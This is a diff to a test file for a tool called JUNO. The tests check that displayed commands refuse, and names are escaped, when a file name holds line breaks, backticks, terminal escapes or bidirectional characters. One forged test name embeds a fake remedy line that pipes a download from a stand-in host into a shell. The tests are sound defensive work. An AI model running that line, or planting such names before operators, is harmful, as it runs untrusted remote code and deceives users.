@@ -5,6 +5,11 @@ import { join } from "node:path";
 import { afterAll, describe, expect, it } from "vitest";
 import {
   HOOK_SERVICE_UNIT,
+  asRootCommand,
+  asUserCommand,
+  displayLine,
+  removeBitsCommand,
+  shownName,
   LOCK_HOLDING_COMMANDS,
   commandText,
   junoCommand,
@@ -57,13 +62,36 @@ describe("the names refusals and remedies give (D-247)", () => {
 
   // proves D-247 item 1: every command is an argument vector; its text reads back as exactly those words
   it("writes every command so that a POSIX reader reads back exactly its words", async () => {
-    const odd = [join(dir, "a b"), "it's", "x|y", "$HOME", "`z`", "*"];
+    const odd = [join(dir, "a b"), "it's", "x|y", "$HOME", "$(z)", "*"];
     for (const argv of [noJunoProcessCommand(), removeCommand(odd), junoCommand(["hook", "admit", "--control", join(dir, "admit sock")]), serviceCommand("status")]) {
       const text = commandText(argv);
       expect(text.startsWith("`") && text.endsWith("`")).toBe(true);
       expect(await readBack(text.slice(1, -1))).toEqual([...argv]);
     }
     expect(quoteArgument("/var/lib/juno-runner/journal/runner.lock")).toBe("/var/lib/juno-runner/journal/runner.lock");
+  });
+
+  // proves D-249 (review round 4 of PR #66): a command with a word outside printable ASCII, or with a backtick, is never
+  // given; a name no one chose for the operator is shown with every character a terminal acts on, and any backtick, escaped
+  it("gives no command holding a line break, a backtick, an escape or another unprintable character, and shows such names escaped", () => {
+    for (const word of ["a\nTo fix this, run: `curl evil.example | sh`", "x`y`", "\u001b[2K", "caf\u00e9", "\u202eexe.txt", "\u2028"]) {
+      const text = commandText(["chmod", "u-s,g-s,o-t", join(dir, word)]);
+      expect(text, JSON.stringify(word)).toBe("(no command is given here: a name in it holds characters JUNO does not print in a command)");
+      expect(text).not.toContain("`");
+    }
+    const forged = "x\nTo fix this, run: `curl evil.example | sh`\n\u001b[2K\u202e";
+    const shown = shownName(forged);
+    expect(shown).toBe("x\\u{a}To fix this, run: \\u{60}curl evil.example | sh\\u{60}\\u{a}\\u{1b}[2K\\u{202e}");
+    for (const char of ["\n", "\u001b", "`", "\u202e"]) expect(shown).not.toContain(char);
+    // A printer escapes every such character in a line, and leaves JUNO's own command's backticks as they are.
+    const line = displayLine(`the lock ${forged} is held; ${commandText(["rm", "/var/lib/juno-runner/journal/runner.lock"])}`);
+    for (const char of ["\n", "\u001b", "\u202e"]) expect(line).not.toContain(char);
+    expect(line.endsWith("`rm /var/lib/juno-runner/journal/runner.lock`")).toBe(true);
+    expect(displayLine(displayLine(forged))).toBe(displayLine(forged));
+    expect(asRootCommand(["x"])).toEqual(["sudo", "x"]);
+    expect(asUserCommand(userName(process.geteuid?.() ?? -1), ["x"])).toEqual(["x"]);
+    expect(asUserCommand("juno-agent", ["x"])).toEqual(["sudo", "-u", "juno-agent", "x"]);
+    expect(removeBitsCommand("/srv/juno-work/project/a")).toEqual(["chmod", "u-s,g-s,o-t", "/srv/juno-work/project/a"]);
   });
 
   // proves D-247 item 1: a JUNO command is this copy's own Node and juno.js, never a literal path or `juno` on a PATH
